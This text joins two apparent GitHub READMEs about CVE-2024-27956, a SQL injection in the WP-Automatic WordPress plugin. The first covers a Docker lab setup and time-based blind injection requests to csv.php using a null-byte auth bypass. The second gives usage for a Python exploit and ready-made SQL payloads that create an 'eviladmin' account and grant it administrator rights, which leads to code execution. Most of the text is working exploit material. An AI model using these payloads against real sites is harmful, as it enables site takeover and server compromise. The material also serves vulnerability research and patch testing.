
# CVE-2024-27956
Note

Build wordpress: docker-compose -f stack.yml up

Install plugin:
1. WordPress dashboard, choose Plugins > Add New

2. Click Upload Plugin

![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/39c596dd-bb5c-457f-87e8-b811a1cd0f12)

3. Choose File -> wp-automatic.zip ->  Install Now

![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/13880686-b083-458b-975d-2cab35c11fc0)

4. After the installation is complete, click Activate Plugin

![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/ecfc78d1-7a43-4ca1-88a0-d6e9db875e60)

Exploit

```<HOST>/wp-content/plugins/wp-automatic/inc/csv.php```

```q={{query}}&auth=%00&integ={{md5query}}```
```
q=SELECT+IF(1=1,sleep(5),sleep(0))&auth=%00&integ=93cf9aa11e746596d6f31765a7222c9f
```
![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/f480537c-5961-4f15-9671-0cc4bf4afd8a)
```
q=SELECT+IF(1=2,sleep(5),sleep(0))&auth=%00&integ=4b1f4024af81df56c3b00679b9b52183
```
![image](https://github.com/truonghuuphuc/CVE-2024-27956/assets/20487674/7311aa48-9c2b-43a9-a858-6488badff071)

# CVE-2024-27956-RCE
A PoC for CVE-2024-27956, a SQL Injection in ValvePress Automatic plugin. This PoC exploit the vulnerability creating a user in the target and giving Administrator rights. Being an administrator in wordpress can lead to Remote Code Execution.

<h1>Usage</h1>

```
git clone https://github.com/diego-tella/CVE-2024-27956-RCE/
cd CVE-2024-27956-RCE
python CVE-2024-27956.py http://target.com
```

<h1>Payloads</h1>
SQL Injection payload to create a user:

```
q=INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')
```

Giving admin rights:

```
q=INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = 'eviladmin'), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}
```

In the q parameter, we can pass our entire query and then it will be executed.

![image](https://github.com/diego-tella/CVE-2024-27956-RCE/assets/70545257/0e24c3ee-52e0-4e7f-9eb1-b54e4096325f)
The user input is executed directly without any kind of restriction or sanitization.

<h1>PoC</h1>
<a href="https://www.youtube.com/watch?v=2y5siI-K-G0"><img src="Screenshot_2.png"></a>
